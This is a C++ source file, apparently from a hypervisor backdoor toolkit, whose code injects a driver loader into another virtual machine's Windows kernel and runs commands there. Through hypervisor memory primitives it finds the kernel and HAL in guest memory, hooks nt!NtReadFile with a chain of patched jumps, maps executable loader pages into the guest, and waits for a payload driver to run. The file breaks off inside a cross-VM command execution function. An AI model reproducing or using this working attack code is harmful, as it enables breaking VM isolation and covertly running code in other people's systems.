#include "stdafx.h"
#include "vmcs.h"

// kernel drivers loader image
#include "../driver_loader_sys.h"
#include "../driver_loader.h"

// secure kernel drivers loader image
#include "../driver_loader_sk_sys.h"
#include "../driver_loader_sk.h"

// cross VM command execution driver image
#include "../vm_exec_kernel_sys.h"
#include "../vm_exec.h"

#define DRIVER_HOOK_SIZE 14
#define DRIVER_HOOK_SIZE_MAX 0x50

#define PROCESSOR_START_BLOCK_ADDR 0x1000

#define JUMP_SIZE_0 2
#define JUMP_SIZE_1 5
#define JUMP_SIZE_2 (DRIVER_HOOK_SIZE + 8)

// virtual address to map kernel drivers loader
#define LOADER_BASE_NT (KUSER_SHARED_DATA + PAGE_SIZE * 0x10)

// virtual address to map secure kernel drivers loader
#define LOADER_BASE_SK (KUSER_SHARED_DATA + PAGE_SIZE * 0x10)

#pragma pack(push, 2)

typedef struct _FAR_JMP_16
{
    uint8_t OpCode;  // = 0xe9
    uint16_t Offset;

} FAR_JMP_16;

typedef struct _PSEUDO_DESCRIPTOR_32
{
    uint16_t Limit;
    uint32_t Base;

} PSEUDO_DESCRIPTOR_32;

#pragma pack(pop)

typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
typedef struct _PROCESSOR_START_BLOCK
{
    // The block starts with a jmp instruction to the end of the block
    FAR_JMP_16 Jmp;

    // Completion flag is set to non-zero when the target processor has
    // started
    uint32_t CompletionFlag;

    // Pseudo descriptors for GDT and IDT
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;

    // ...

} PROCESSOR_START_BLOCK;

// other fields offsets
#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
#define PROCESSOR_START_BLOCK_Cr3           0xa0

extern bool m_quiet;
//--------------------------------------------------------------------------------------
int check_loader_image(uint8_t *loader, int loader_size)
{
    IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
        RVATOVA(loader, ((IMAGE_DOS_HEADER *)loader)->e_lfanew);

    if (hdr->OptionalHeader.SizeOfImage != loader_size)
    {
        printf("ERROR: Driver loader has invalid image size\n");
        return -1;
    }

    if (hdr->OptionalHeader.FileAlignment != hdr->OptionalHeader.SectionAlignment)
    {
        printf("ERROR: Driver loader has invalid section alignment\n");
        return -1;
    }

    if (hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress != 0)
    {
        printf("ERROR: Driver loader must have no imports\n");
        return -1;
    }

    return 0;
}
//--------------------------------------------------------------------------------------
bool ept_is_host_vtl0(uint64_t ept_addr)
{
    uint64_t pte_addr = 0, pte_val = 0;
    HVBD_PTE_SIZE pte_size;

    // get EPT paget table entry address
    if (backdoor_pte_ept_addr(0x1000, &pte_addr, &pte_size, ept_addr) != 0)
    {
        return false;
    }

    // read page table entry contents
    if (backdoor_phys_read_64(pte_addr, &pte_val) != 0)
    {
        return false;
    }

    // entry usually is not executable in VTL0
    return EPT_X(pte_val) == 0;
}

bool ept_is_host_vtl1(uint64_t ept_addr)
{
    uint64_t pte_addr = 0, pte_val = 0;
    HVBD_PTE_SIZE pte_size;

    // get EPT paget table entry address
    if (backdoor_pte_ept_addr(0x1000, &pte_addr, &pte_size, ept_addr) != 0)
    {
        return false;
    }

    // read page table entry contents
    if (backdoor_phys_read_64(pte_addr, &pte_val) != 0)
    {
        return false;
    }

    // entry usually is executable in VTL1
    return EPT_X(pte_val) != 0;
}

bool ept_is_guest(uint64_t ept_addr)
{
    uint64_t phys_addr = 0;

    m_quiet = true;

    // get zero page host physical address
    backdoor_phys_translate(0, &phys_addr, ept_addr);

    m_quiet = false;

    // in VM host physical address is different than guest physical address
    return phys_addr != 0;
}
//--------------------------------------------------------------------------------------
int backdoor_vm_inject(uint64_t ept_addr, uint64_t *payload_addr, uint8_t *payload, int payload_size, bool report_error)
{
    int ret = -1;
    uint64_t phys_addr = 0, current_pml4_addr = 0, current_ept_addr = 0;
    uint8_t *data = NULL;

    // read current cr3 value
    if (backdoor_vmread(GUEST_CR3, &current_pml4_addr) != 0)
    {
        return -1;
    }

    // read current EPT address
    if (backdoor_ept_addr(&current_ept_addr) != 0)
    {
        return -1;
    }

    printf("[+] Current CR3 value is 0x%.16llx\n", current_pml4_addr);
    printf("[+] Current EPT address is 0x%.16llx\n", current_ept_addr);

    int loader_size = sizeof(driver_loader_sys);
    uint8_t *loader = driver_loader_sys;    

    // do some basic sanity checks of the loader image
    if (check_loader_image(loader, loader_size) != 0)
    {
        return -1;
    }

    uint32_t payload_mem_size = _ALIGN_UP(payload_size, PAGE_SIZE); 
    uint8_t *payload_mem = NULL;

    uint32_t loader_mem_size = _ALIGN_UP(loader_size, PAGE_SIZE);
    uint8_t *loader_mem = NULL;

    if (payload)
    {
        // allocate memory for the payload
        if ((payload_mem = (uint8_t *)VirtualAlloc(NULL, payload_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
        {
            printf("VirtualAlloc() ERROR %d\n", GetLastError());
            return -1;
        }

        memcpy(payload_mem, payload, payload_size);
    }    

    // allocate memory for the loader
    if ((loader_mem = (uint8_t *)VirtualAlloc(NULL, loader_mem_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
    {
        printf("VirtualAlloc() ERROR %d\n", GetLastError());
        return -1;
    }

    memcpy(loader_mem, loader, loader_size);    

    if ((data = (uint8_t *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    printf("[+] Target EPT is at 0x%.16llx\n", ept_addr);

    m_quiet = true;

    // get host physical address of PROCESSOR_START_BLOCK
    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR, &phys_addr, ept_addr) != 0)
    {
        m_quiet = false;

        goto _end;
    }

    m_quiet = false;      
    
    if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
    {
        goto _end;
    }

    // check for the sane processor start block
    PROCESSOR_START_BLOCK *info = (PROCESSOR_START_BLOCK *)data;
    uint64_t hal_lm_stub = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_HalpLMStub);
    uint64_t pml4_addr = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_Cr3);

    if (info->Jmp.OpCode != 0xe9 || info->CompletionFlag != 1 || hal_lm_stub == 0 || pml4_addr == 0)
    {
        printf("ERROR: Bad PROCESSOR_START_BLOCK\n");
        goto _end;
    }    

    printf("[+] Found valid PROCESSOR_START_BLOCK at 0x%.16llx\n", phys_addr);

    printf("\n   CompletionFlag: 0x%.8x\n", info->CompletionFlag);
    printf("     HalpLMStub(): 0x%llx\n", hal_lm_stub);
    printf("     PML4 address: 0x%llx\n\n", pml4_addr);

    printf("[+] Locating kernel image in memory...\n");
            
    uint64_t hal_addr_virt = _ALIGN_DOWN(hal_lm_stub, PAGE_SIZE);
    uint64_t hal_addr_phys = 0;
    uint32_t hal_size = 0;

    uint64_t nt_addr_virt = 0;
    uint64_t nt_addr_phys = 0;
    uint32_t nt_size = 0;

    uint32_t hal_idata_addr = 0;
    uint32_t hal_idata_size = 0;

    while (hal_lm_stub - hal_addr_virt < PAGE_SIZE * 0x500)
    {
        m_quiet = true;

        if (backdoor_virt_translate(hal_addr_virt, &phys_addr, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;  

            goto _end;
        }

        m_quiet = false;

        uint16_t signature = 0;

        if (backdoor_phys_read_16(phys_addr, &signature) != 0)
        {
            goto _end;
        }

        if (signature == IMAGE_DOS_SIGNATURE)
        {
            if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
            {
                goto _end;
            }

            IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                RVATOVA(data, ((IMAGE_DOS_HEADER *)data)->e_lfanew); 

            // check for the sane header
            if (hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE &&
                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&                 
                hdr->FileHeader.NumberOfSections > 10)
            {
                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

                IMAGE_SECTION_HEADER *sec_curr = sec;

                // look for the PAGEVRFY section, HAL doesn't have it
                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec_curr->Name, "PAGEVRFY", 8))
                    {
                        // HalpLMStub() points to the kernel image!
                        nt_addr_virt = hal_addr_virt;
                        goto _nt_found;
                    }

                    sec_curr += 1;
                }

                sec_curr = sec;

                // look for the .idata section
                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec_curr->Name, ".idata", 6))
                    {
                        hal_idata_addr = sec_curr->VirtualAddress;
                        hal_idata_size = sec_curr->Misc.VirtualSize;
                        break;
                    }

                    sec_curr += 1;
                }

                hal_addr_phys = phys_addr;
                hal_size = hdr->OptionalHeader.SizeOfImage;
                break;
            }                
        }            

        hal_addr_virt -= PAGE_SIZE;
    }

    if (hal_addr_phys == 0 || hal_size == 0)
    {
        printf("ERROR: Unable to locate HAL image\n");
        goto _end;
    }

    if (hal_idata_addr == 0 || hal_idata_size == 0)
    {
        printf("ERROR: Unable to locate '.idata' section of HAL image\n");
        goto _end;
    }

    printf("[+] HAL.DLL is at 0x%llx (physical: 0x%llx)\n", hal_addr_virt, hal_addr_phys);        

    hal_size = _ALIGN_UP(hal_size, PAGE_SIZE);

    void *hal_image = malloc(hal_size);
    if (hal_image)
    {
        memset(hal_image, 0, hal_size);

        for (uint32_t i = 0; i < hal_size; i += PAGE_SIZE)
        {
            if (i == 0 || (i >= hal_idata_addr && i < hal_idata_addr + hal_idata_size))
            {
                m_quiet = true;

                if (backdoor_virt_translate(hal_addr_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
                {
                    m_quiet = false;
                    continue;
                }

                m_quiet = false;

                if (backdoor_phys_read(phys_addr, (uint8_t *)hal_image + i, PAGE_SIZE) != 0)
                {
                    free(hal_image);
                    goto _end;
                }
            }                
        }

        IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
            RVATOVA(hal_image, ((IMAGE_DOS_HEADER *)hal_image)->e_lfanew);

        uint32_t imp_addr = hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
        if (imp_addr != 0)
        {
            uint32_t imp_size = hdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;

            IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR *)RVATOVA(hal_image, imp_addr);

            // first import thunk of hal is ntoskrnl
            uint64_t *imp_thunk = (uint64_t *)RVATOVA(hal_image, imp->FirstThunk);
                                
            // get ntoskrnl pointer
            nt_addr_virt = _ALIGN_DOWN(*imp_thunk, PAGE_SIZE);                
        }

        free(hal_image);
    }
    else
    {
        goto _end;
    }

    if (nt_addr_virt == 0)
    {
        printf("ERROR: Unable to locate kernel pointer\n");
        goto _end;
    }

_nt_found:

    uint32_t nt_sec_align = 0, ptr = 0;
    uint32_t nt_text_addr = 0, nt_text_size = 0;
    uint32_t nt_edata_addr = 0, nt_edata_size = 0;    

    while (ptr < PAGE_SIZE * 0x200)
    {
        m_quiet = true;

        if (backdoor_virt_translate(nt_addr_virt, &phys_addr, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;  

            goto _end;
        }

        m_quiet = false;

        uint16_t signature = 0;

        if (backdoor_phys_read_16(phys_addr, &signature) != 0)
        {
            goto _end;
        }

        if (signature == IMAGE_DOS_SIGNATURE)
        {
            if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
            {
                goto _end;
            }

            IMAGE_NT_HEADERS *hdr = (IMAGE_NT_HEADERS *)
                RVATOVA(data, ((IMAGE_DOS_HEADER *)data)->e_lfanew);

            // check for the sane header
            if (hdr->OptionalHeader.Subsystem == IMAGE_SUBSYSTEM_NATIVE &&
                hdr->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 &&
                hdr->FileHeader.NumberOfSections > 10)
            {
                IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)
                    RVATOVA(&hdr->OptionalHeader, hdr->FileHeader.SizeOfOptionalHeader);

                for (int i = 0; i < hdr->FileHeader.NumberOfSections; i += 1)
                {
                    if (!strncmp((char *)&sec->Name, ".text", 5))
                    {
                        nt_text_addr = sec->VirtualAddress;
                        nt_text_size = sec->Misc.VirtualSize;
                    }
                    else if (!strncmp((char *)&sec->Name, ".edata", 6))
                    {
                        nt_edata_addr = sec->VirtualAddress;
                        nt_edata_size = sec->Misc.VirtualSize;
                    }

                    sec += 1;
                }

                nt_addr_phys = phys_addr;
                nt_size = hdr->OptionalHeader.SizeOfImage;
                nt_sec_align = hdr->OptionalHeader.SectionAlignment;
                break;
            }
        }            

        nt_addr_virt -= PAGE_SIZE;
        ptr += PAGE_SIZE;
    }

    if (nt_addr_phys == 0 || nt_size == 0)
    {
        printf("ERROR: Unable to locate kernel base\n");
        goto _end;
    }

    if (nt_text_addr == 0 || nt_text_size == 0)
    {
        printf("ERROR: Unable to locate '.text' section of kernel image\n");
        goto _end;
    }

    if (nt_edata_addr == 0 || nt_edata_size == 0)
    {
        printf("ERROR: Unable to locate '.edata' section of kernel image\n");
        goto _end;
    }

    printf("[+] Kernel is at 0x%llx (physical: 0x%llx)\n", nt_addr_virt, nt_addr_phys);    

    uint32_t nt_text_max_size  = _ALIGN_UP(nt_text_size, nt_sec_align);
    uint64_t nt_func_virt = 0, nt_func_phys = 0;

    // check if we have enough of free space at the end of the code section
    if (nt_text_max_size - nt_text_size < JUMP_SIZE_2)
    {
        printf("ERROR: Not enough of free space at the end of the code section\n");
        goto _end;
    }

    nt_size = _ALIGN_UP(nt_size, PAGE_SIZE);

    void *nt_image = malloc(nt_size);
    if (nt_image)
    {
        uint32_t rva = 0;

        memset(nt_image, 0, nt_size);

        for (uint32_t i = 0; i < nt_size; i += PAGE_SIZE)
        {
            if (i == 0 || (i >= nt_edata_addr && i < nt_edata_addr + nt_edata_size))
            {
                m_quiet = true;    

                if (backdoor_virt_translate(nt_addr_virt + i, &phys_addr, pml4_addr, ept_addr) != 0)
                {
                    m_quiet = false;
                    continue;
                }

                m_quiet = false;

                if (backdoor_phys_read(phys_addr, (uint8_t *)nt_image + i, PAGE_SIZE) != 0)
                {
                    free(nt_image);
                    goto _end;
                }
            }                
        }

        if ((rva = LdrGetProcAddress(nt_image, "NtReadFile")) != 0)
        {
            // get nt!NtReadFile() virtual address
            nt_func_virt = nt_addr_virt + rva;
            m_quiet = true;

            // get nt!NtReadFile() physical address
            backdoor_virt_translate(nt_func_virt, &nt_func_phys, pml4_addr, ept_addr);

            m_quiet = false;
        }
        else
        {
            printf("ERROR: Unable to locate nt!NtReadFile()\n");
        }        

        free(nt_image);

        if (nt_func_phys == 0)
        {
            goto _end;
        }
    }
    else
    {
        goto _end;
    }    

    printf("[+] nt!NtReadFile() is at 0x%llx (physical: 0x%llx)\n", nt_func_virt, nt_func_phys);               

    uint64_t driver_base_virt = LOADER_BASE_NT;

    uint32_t driver_m_Params = 0;
    uint32_t driver_new_func = 0;
    uint32_t driver_old_func = 0;

    uint32_t nt_func_saved_size = 0;
    uint64_t info_addr = 0, image_addr = 0;
    uint8_t nt_func_buff[DRIVER_HOOK_SIZE_MAX];    

    printf("[+] Driver loader virtual address is 0x%llx (size: 0x%x)\n", driver_base_virt, loader_mem_size);

    // check if needed virtual memory range is free
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {
        uint64_t pte_addr = 0, pte = 0;
        HVBD_PTE_SIZE pte_size;

        m_quiet = true;        

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            printf("ERROR: Unable to get PTE address for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        m_quiet = false;

        if (pte_size != HVBD_PTE_SIZE_4K)
        {
            printf("ERROR: Unexpected page size for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        // read page table entry contents
        if (backdoor_phys_read_64(pte_addr, &pte) != 0)
        {
            goto _end;
        }

        if (pte != 0)
        {
            printf("ERROR: Unexpected PTE for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }        
    }

    uint64_t addr_jump_1_virt = nt_func_virt - JUMP_SIZE_1;
    uint64_t addr_jump_2_virt = nt_addr_virt + nt_text_addr + nt_text_size;
    uint64_t addr_jump_1_phys = 0, addr_jump_2_phys = 0;

    uint8_t buff_jump_1[JUMP_SIZE_1], buff_jump_2[JUMP_SIZE_2];
    uint8_t data_jump_1[JUMP_SIZE_1], data_jump_2[JUMP_SIZE_2];

    memset(data_jump_1, 0xcc, sizeof(data_jump_1));
    memset(data_jump_2, 0x00, sizeof(data_jump_2));

    m_quiet = true;

    // get 2-nd and 3-rd jumps physical address
    backdoor_virt_translate(addr_jump_1_virt, &addr_jump_1_phys, pml4_addr, ept_addr);
    backdoor_virt_translate(addr_jump_2_virt, &addr_jump_2_phys, pml4_addr, ept_addr);

    m_quiet = false;

    if (addr_jump_1_phys == 0 || addr_jump_2_phys == 0)
    {
        goto _end;
    }

    if (backdoor_phys_read(addr_jump_1_phys, data, JUMP_SIZE_1) != 0)
    {
        goto _end;
    }

    // sanity check
    if (memcmp(data_jump_1, data, JUMP_SIZE_1) != 0)
    {
        printf("ERROR: Can't allocate 2-nd jump\n");
        goto _end;
    }

    if (backdoor_phys_read(addr_jump_2_phys, data, JUMP_SIZE_2) != 0)
    {
        goto _end;
    }

    // sanity check
    if (memcmp(data_jump_2, data, JUMP_SIZE_2) != 0)
    {
        printf("ERROR: Can't allocate 3-rd jump\n");
        goto _end;
    }

    /*
        We're using HVBD_DATA structure field as temporary hypervisor memory area
        to store kernel kernel driver load flag (see backdoor_driver.cpp)
    */
    if (backdoor_ept_info_addr(&info_addr) != 0)
    {
        goto _end;
    }

    if (backdoor_virt_write_32(info_addr + DRIVER_INFO_COUNT, 0) != 0)
    {
        goto _end;
    }

    if (backdoor_virt_write_64(info_addr + DRIVER_INFO_ADDR, 0) != 0)
    {
        goto _end;
    }    

    if (!LdrProcessRelocs(loader_mem, (void *)driver_base_virt))
    {
        printf("ERROR: Unable to relocate driver loader image\n");
        goto _end;
    }

    driver_m_Params = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_ORD_PARAMS));
    driver_new_func = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_ORD_HANDLER));
    driver_old_func = LdrGetProcAddress(loader_mem, LDR_ORDINAL(DRIVER_ORD_CALLGATE));

    if (driver_m_Params == 0 || driver_new_func == 0 || driver_old_func == 0)
    {
        printf("ERROR: Unable to locate needed driver image exports\n");
        goto _end;   
    }      

    DRIVER_PARAMS loader_params;

    // set up driver parameters
    loader_params.kernel_base = (void *)nt_addr_virt;
    loader_params.driver_base = (void *)driver_base_virt;
    loader_params.payload_base = payload_mem;
    loader_params.payload_pages_count = payload_mem_size / PAGE_SIZE;
    loader_params.payload_ept = current_ept_addr;    
    loader_params.payload_pml4 = current_pml4_addr;

    // copy driver parameters
    memcpy(loader_mem + driver_m_Params, &loader_params, sizeof(loader_params));

    // save old code of kernel function to hook
    if (backdoor_phys_read(nt_func_phys, nt_func_buff, DRIVER_HOOK_SIZE_MAX) != 0)
    {
        goto _end;      
    }

    // initialize disassembler engine
    ud_t ud_obj;
    ud_init(&ud_obj);

    // set mode, syntax and vendor
    ud_set_mode(&ud_obj, 64);
    ud_set_vendor(&ud_obj, UD_VENDOR_INTEL);

    uint32_t inst_ptr = 0;

    while (nt_func_saved_size < JUMP_SIZE_0)
    {
        ud_set_input_buffer(&ud_obj, nt_func_buff + inst_ptr, DRIVER_HOOK_SIZE_MAX - inst_ptr);

        // get length of instruction
        uint32_t inst_len = ud_disassemble(&ud_obj);
        if (inst_len == 0)
        {
            // error while disassembling instruction
            printf("ERROR: Can't disassemble instruction at offset %d\n", inst_ptr);
            break;
        }

        if (ud_obj.mnemonic == UD_Ijmp || ud_obj.mnemonic == UD_Icall)
        {
            // call/jmp with relative address
            printf("ERROR: call/jmp/jxx instruction at offset %d\n", inst_ptr);
            break; 
        }

        for (int i = 0; i < 3; i++)
        {
            if (ud_obj.operand[i].type == UD_OP_JIMM)
            {
                // jxx with relative address
                printf("ERROR: jxx instruction at offset %d\n", inst_ptr);
                break;
            }

            if (ud_obj.operand[i].base == UD_R_RIP)
            {
                // RIP relative operand
                printf("ERROR: RIP-relative instruction at offset %d\n", inst_ptr);
                break;
            }
        }

        inst_ptr += inst_len;
        nt_func_saved_size += inst_len;

        if (ud_obj.mnemonic == UD_Ijmp  ||
            ud_obj.mnemonic == UD_Iret  ||
            ud_obj.mnemonic == UD_Iretf ||
            ud_obj.mnemonic == UD_Iiretw ||
            ud_obj.mnemonic == UD_Iiretq ||
            ud_obj.mnemonic == UD_Iiretd)
        {
            // end of the function thunk?
            break;
        }
    }

    if (JUMP_SIZE_0 > nt_func_saved_size)
    {
        printf(
            "ERROR: Not enough memory for jump (%d bytes found, %d required)\n", 
            nt_func_saved_size, JUMP_SIZE_0
        );

        goto _end;  
    }

    printf("[+] Patch size is %d bytes\n", nt_func_saved_size);

    // save original function code
    memcpy(loader_mem + driver_old_func, nt_func_buff, nt_func_saved_size);

    // jump from callgate to function
    *(uint16_t *)(loader_mem + driver_old_func + nt_func_saved_size) = 0x25ff;
    *(uint32_t *)(loader_mem + driver_old_func + nt_func_saved_size + 2) = 0;
    *(uint64_t *)(loader_mem + driver_old_func + nt_func_saved_size + 6) = nt_func_virt + nt_func_saved_size;

    // map driver loader into the virtual memory
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {   
        uint64_t pte_addr = 0;
        HVBD_PTE_SIZE pte_size;
        X64_PAGE_TABLE_ENTRY_4K pte;

        m_quiet = true;  

        // get physical address of the driver loader page
        if (backdoor_virt_translate((uint64_t)loader_mem + i, &phys_addr, current_pml4_addr, current_ept_addr) != 0)
        {
            m_quiet = false;  

            goto _end;
        }

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            goto _end;
        }

        m_quiet = false;

        // construct page table entry
        pte.Uint64 = 0;
        pte.Bits.PageTableBaseAddress = PAGE_TO_PFN(phys_addr);
        pte.Bits.ReadWrite = 1;
        pte.Bits.Present = 1;      

        // write page table entry contents
        if (backdoor_phys_write_64(pte_addr, pte.Uint64) != 0)
        {
            goto _end;
        }

        m_quiet = true;

        // make page executable
        if (backdoor_modify_pt(HVBD_MEM_WRITEABLE | HVBD_MEM_EXECUTABLE, driver_base_virt + i, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            printf("ERROR: Unable to set executable permissions for 0x%llx\n", driver_base_virt + i);
            goto _end;
        }

        m_quiet = false;
    }

    backdoor_invalidate_caches();
    bd_yeld();

    // jump to the 3-rd jump
    *(uint8_t *)(buff_jump_1 + 0) = 0xe9;
    *(uint32_t *)(buff_jump_1 + 1) = (uint32_t)(addr_jump_2_virt - addr_jump_1_virt - JUMP_SIZE_1);

    // jump to the handler
    *(uint32_t *)(buff_jump_2 + 0) = 0xd8200f90; // mov rax, cr3
    *(uint32_t *)(buff_jump_2 + 4) = 0xd8220f90; // mov cr3, rax
    *(uint16_t *)(buff_jump_2 + 8) = 0x25ff;
    *(uint32_t *)(buff_jump_2 + 10) = 0;
    *(uint64_t *)(buff_jump_2 + 14) = driver_base_virt + driver_new_func;

    // write 3-rd jump
    if (backdoor_phys_write(addr_jump_2_phys, buff_jump_2, sizeof(buff_jump_2)) != 0)
    {
        goto _end;
    }

    // write 2-nd jump
    if (backdoor_phys_write(addr_jump_1_phys, buff_jump_1, sizeof(buff_jump_1)) != 0)
    {
        goto _end;
    }

    // overwrite nt!NtReadFile() with the short jump to the 2-nd jump
    if (backdoor_phys_write_16(nt_func_phys, 0xf9eb) != 0)
    {
        goto _end;   
    }

    backdoor_invalidate_caches();

    printf(
        "[+] nt!NtReadFile() hook was set: 0x%llx -> 0x%llx\n", 
        nt_func_virt, driver_base_virt + driver_new_func
    );

    printf("[+] Waiting for the payload driver to be executed...\n");

    while (true)
    {
        uint32_t val = 0;

        // read kernel driver call counter
        if (backdoor_virt_read_32(info_addr + DRIVER_INFO_COUNT, &val) != 0)
        {
            goto _end;
        }

        // check if kernel driver was executed
        if (val > 0)
        {
            printf("[+] Payload driver was executed!\n");
            break;
        }

        bd_sleep(1000);
    }

    // read allocated image address
    if (backdoor_virt_read_64(info_addr + DRIVER_INFO_ADDR, &image_addr) != 0)
    {
        goto _end;
    }

    if (payload_addr)
    {
        *payload_addr = image_addr;
    }

    if (image_addr != 0)
    {
        // success
        ret = 0;
    }
    
    if (payload)
    {
        if (report_error)
        {
            if (image_addr != 0)
            {
                printf("[+] Payload driver image address is 0x%llx\n", image_addr);
            }
            else
            {
                printf("ERROR: Driver loader was unable to load payload driver\n");
            }
        }
        else
        {
            // not actually success but success
            ret = 0;
        }
    }
    
    printf("[+] Performing cleanup...\n");

    // restore patched function
    if (backdoor_phys_write_16(nt_func_phys, *(uint16_t *)nt_func_buff) != 0)
    {
        goto _end;   
    }

    bd_sleep(1000);    

    // restore 3-rd jump
    if (backdoor_phys_write(addr_jump_2_phys, data_jump_2, sizeof(data_jump_2)) != 0)
    {
        goto _end;
    }

    // restore 2-nd jump
    if (backdoor_phys_write(addr_jump_1_phys, data_jump_1, sizeof(data_jump_1)) != 0)
    {
        goto _end;
    }

    // unmap driver loader from virtual memory
    for (uint32_t i = 0; i < loader_mem_size; i += PAGE_SIZE)
    {   
        uint64_t pte_addr = 0;
        HVBD_PTE_SIZE pte_size;

        m_quiet = true;        

        // get physical address of the page table entry
        if (backdoor_pte_addr(driver_base_virt + i, &pte_addr, &pte_size, pml4_addr, ept_addr) != 0)
        {
            m_quiet = false;

            goto _end;
        }

        m_quiet = false;

        // write page table entry contents
        if (backdoor_phys_write_64(pte_addr, 0) != 0)
        {
            goto _end;
        }
    }
        
    printf("[+] DONE\n");    

_end:

    if (data)
    {
        free(data);
    }

    if (loader_mem)
    {
        VirtualFree(loader_mem, 0, MEM_RELEASE);
    }

    if (payload_mem)
    {
        VirtualFree(payload_mem, 0, MEM_RELEASE);
    }    

    return ret;
}
//--------------------------------------------------------------------------------------
int backdoor_vm_exec_find_info(uint64_t ept_addr, uint64_t *proc_pml4_addr, uint64_t *info_addr)
{    
    int ret = -1;
    uint64_t phys_addr = 0;
    VM_EXEC_INFO exec_info;

    *proc_pml4_addr = 0;
    *info_addr = 0;

    m_quiet = true;

    void *data = malloc(PAGE_SIZE);
    if (data == NULL)
    {
        goto _end;
    }

    // get host physical address of PROCESSOR_START_BLOCK
    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR, &phys_addr, ept_addr) != 0)
    {
        m_quiet = false;

        goto _end;
    }

    m_quiet = false;

    if (backdoor_phys_read(phys_addr, data, PAGE_SIZE) != 0)
    {
        goto _end;
    }

    PROCESSOR_START_BLOCK *info = (PROCESSOR_START_BLOCK *)data;
    uint64_t hal_lm_stub = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_HalpLMStub);
    uint64_t pml4_addr = *(uint64_t *)((uint8_t *)info + PROCESSOR_START_BLOCK_Cr3);

    // check for the sane processor start block
    if (info->Jmp.OpCode != 0xe9 || info->CompletionFlag != 1 || hal_lm_stub == 0 || pml4_addr == 0)
    {
        printf("ERROR: Bad PROCESSOR_START_BLOCK\n");
        goto _end;
    }
        
    ret = 0;

    m_quiet = true;

    // get host physical address of VM_EXEC_INFO structure
    if (backdoor_phys_translate(PROCESSOR_START_BLOCK_ADDR + VM_EXEC_INFO_ADDR, &phys_addr, ept_addr) != 0)
    {
        m_quiet = false;

        goto _end;
    }

    m_quiet = false;

    if (backdoor_phys_read(phys_addr, &exec_info, sizeof(exec_info)) != 0)
    {
        goto _end;
    }

    if (exec_info.signature == VM_EXEC_INFO_SIGN && exec_info.struct_addr != 0)
    {
        // return VM_EXEC_INFO physical address to the caller
        *proc_pml4_addr = exec_info.page_dir;
        *info_addr = exec_info.struct_addr;        
    }

_end:

    if (data)
    {
        free(data);
    }

    return ret;
}

int backdoor_vm_exec(uint64_t ept_addr, char *command)
{
    int ret = -1;
    uint64_t info_addr = 0, pml4_addr = 0;
    VM_EXEC_STRUCT exec_struct;

    if (strlen(command) >= VM_EXEC_MAX_COMMAND_LEN)
    {
        printf("ERROR: Command line is too long\n");
        return -1;
    }

    // check if kernel driver is already loaded
    if (backdoor_vm_exec_find_info(ept_addr, &pml4_addr, &info_addr) != 0)
    {
        printf("ERROR: backdoor_vm_exec_find_info() fails\n");
        return -1;
    }

    if (info_addr == 0)
    {
        printf("[+] Loading VM exec drvier...\n");

        // load VM exec driver into the specified partition
        if (backdoor_vm_inject(ept_addr, NULL, vm_exec_kernel_sys, sizeof(vm_exec_kernel_sys), false) != 0)
        {
            printf("ERROR: Can't load VM exec drvier\n");
            return -1;
        }

        printf("[+] VM exec drvier was loaded\n");
        
        // check if kernel driver is loaded        
        if (backdoor_vm_exec_find_info(ept_addr, &pml4_addr, &info_addr) != 0)
        {
            printf("ERROR: backdoor_vm_exec_find_info() fails\n");
            return -1;
        }

        if (info_addr == 0)
        {
            printf("ERROR: VM exec drvier failed to inject user mode DLL\n");
            return -1;
        }
    }
    else
    {
        printf("[+] VM exec drvier is already loaded\n");
    }    

    printf("[+] Target CR3 value is 0x%.16llx\n", pml4_addr);
